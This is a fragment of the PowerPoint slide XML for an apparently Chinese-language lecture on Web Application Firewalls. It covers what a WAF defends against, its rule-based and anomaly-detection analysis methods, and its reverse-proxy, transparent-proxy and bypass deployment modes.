            </a:r>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982027" y="2961958"/>
            <a:ext cx="6600825" cy="2524125"/>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4959" y="1346344"/>
            <a:ext cx="8111114" cy="4902055"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>应用防火墙（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web Application Firewall, WAF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>）是一种专门保护</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>应用免受本章前面介绍的各种</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>应用攻击的安全防护系统，对每一个</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>HTTP/HTTPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>请求进行内容检测和验证，确保每个用户请求有效且安全的情况下才交给</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>服务器处理，对非法的请求予以实时阻断或隔离、记录、告警等，确保</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>应用的安全性</a:t>
            </a:r>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28861" y="1691323"/>
            <a:ext cx="6653183" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
      </p:pic>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2" y="1340802"/>
            <a:ext cx="8058467" cy="4755197"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>基本安全功能：</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>防止常见的各类网络攻击，如：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>注入、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>跨站、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>、网页后门等；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>防止各类自动化攻击，如：暴力破解、撞库、批量注册、自动发贴等；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>阻止其它常见威胁，如：爬虫、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>0 DAY</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>攻击、代码分析、嗅探、数据篡改、越权访问、敏感信息泄漏、应用层</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>DDoS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>、盗链、越权、扫描等。</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2" y="1340802"/>
            <a:ext cx="8058467" cy="4755197"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>基本安全功能：</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>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2573575" y="1996440"/>
            <a:ext cx="4137500" cy="3901439"/>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基本原理</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>WAF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>主要提供对</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>应用层数据的解析，对不同的编码方式做强制多重转换还原为可分析的明文，对转换后的消息进行深度分析。主要的分析方法主要有两类，一类是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>基于规则的分析方法</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>，另一类是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>异常检测方法</a:t>
            </a:r>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WAF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>部署</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>WAF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>部署在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>服务器的前面，一般是串行接入，不仅在硬件性能上要求高，而且不能影响</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>服务，同时还要与负载均衡、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web Cache</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>等</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>服务器前的常见产品协调部署</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>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3" y="1417003"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>WAF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>部署</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>WAF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>的部署模式有三种：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>反向代理</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>透明代理</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>旁路</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>。常用的是反向、透明两种模式，因为旁路只有监听功能，不能对访问进行拦截、没有防护能力，因此使用的较少。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>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3" y="1417003"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>WAF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>部署：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>反向代理</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>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grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="8" name="组合 7"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1150938" y="2281237"/>
            <a:ext cx="6973888" cy="3250566"/>
            <a:chOff x="1150938" y="2281237"/>
            <a:chExt cx="6973888" cy="3250566"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="4" name="图片 3"/>
            <p:cNvPicPr>
              <a:picLocks noChangeAspect="1"/>
            </p:cNvPicPr>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill>
            <a:blip r:embed="rId1"/>
            <a:stretch>
              <a:fillRect/>
            </a:stretch>
          </p:blipFill>
          <p:spPr>
            <a:xfrm>
              <a:off x="1150938" y="2281237"/>
              <a:ext cx="6436043" cy="3250566"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="5" name="文本框 4"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2856144" y="4343400"/>
              <a:ext cx="1415772" cy="830997"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:schemeClr val="bg1">
                <a:lumMod val="95000"/>
              </a:schemeClr>
            </a:solidFill>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="0" dirty="0">
                  <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                  <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                </a:rPr>
                <a:t>反向代码</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" b="0" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="0" dirty="0">
                  <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                  <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                </a:rPr>
                <a:t>WAF</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" b="0" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="6" name="文本框 5"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6401277" y="4112567"/>
              <a:ext cx="1723549" cy="461665"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:schemeClr val="bg1">
                <a:lumMod val="95000"/>
              </a:schemeClr>
            </a:solidFill>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="0" dirty="0">
                  <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                  <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                </a:rPr>
                <a:t>原始服务器</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" b="0" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="7" name="文本框 6"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1257413" y="4297233"/>
              <a:ext cx="800219" cy="461665"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:schemeClr val="bg1">
                <a:lumMod val="95000"/>
              </a:schemeClr>
            </a:solidFill>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="0" dirty="0">
                  <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                  <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                </a:rPr>
                <a:t>用户</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" b="0" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:endParaRP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3093" y="1417003"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>WAF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>部署：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>透明代理</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>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grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="10" name="组合 9"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1080095" y="2508884"/>
            <a:ext cx="6862751" cy="2291715"/>
            <a:chOff x="1080095" y="2508884"/>
            <a:chExt cx="6862751" cy="2291715"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="5" name="图片 4"/>
            <p:cNvPicPr>
              <a:picLocks noChangeAspect="1"/>
            </p:cNvPicPr>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill>
            <a:blip r:embed="rId1"/>
            <a:stretch>
              <a:fillRect/>
            </a:stretch>
          </p:blipFill>
          <p:spPr>
            <a:xfrm>
              <a:off x="1150938" y="2508884"/>
              <a:ext cx="6399531" cy="2291715"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="6" name="文本框 5"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4014384" y="4175760"/>
              <a:ext cx="2066143" cy="461665"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:schemeClr val="bg1">
                <a:lumMod val="95000"/>
              </a:schemeClr>
            </a:solidFill>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="0" dirty="0">
                  <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                  <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                </a:rPr>
                <a:t>透明代码</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="0" dirty="0">
                  <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                  <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                </a:rPr>
                <a:t>WAF</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" b="0" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="7" name="文本框 6"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6219297" y="3944927"/>
              <a:ext cx="1723549" cy="461665"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:schemeClr val="bg1">
                <a:lumMod val="95000"/>
              </a:schemeClr>
            </a:solidFill>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="0" dirty="0">
                  <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                  <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                </a:rPr>
                <a:t>原始服务器</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" b="0" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="8" name="文本框 7"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1080095" y="4025592"/>
              <a:ext cx="800219" cy="461665"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:schemeClr val="bg1">
                <a:lumMod val="95000"/>
              </a:schemeClr>
            </a:solidFill>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="0" dirty="0">
                  <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                  <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                </a:rPr>
                <a:t>用户</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" b="0" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:gr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25563"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>WAF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>部署：</a:t>
            </a:r>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620713" y="2011680"/>
            <a:ext cx="7810500" cy="4587240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solid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799" y="1371600"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>WAF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>部署</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>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3022282" y="1371600"/>
            <a:ext cx="5435917" cy="470916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171575" y="1101725"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>WAF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>部署</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>WAF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>与网络防火墙能一起部署吗？</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>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3261360" y="2225040"/>
            <a:ext cx="4724400" cy="4099560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="图片 4"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="3596640"/>
            <a:ext cx="3097530" cy="921067"/>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产品</a:t>
            </a:r>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5" name="图片 4"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2648902" y="1280161"/>
            <a:ext cx="5584191" cy="5032058"/>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230188" y="1299210"/>
            <a:ext cx="8629650" cy="1952625"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="图片 4"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="132020" y="3252787"/>
            <a:ext cx="3648075" cy="1809750"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="图片 5"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4836477" y="3274376"/>
            <a:ext cx="3429000" cy="1343025"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="图片 6"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="133867" y="5147628"/>
            <a:ext cx="3652837" cy="1552575"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="图片 7"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
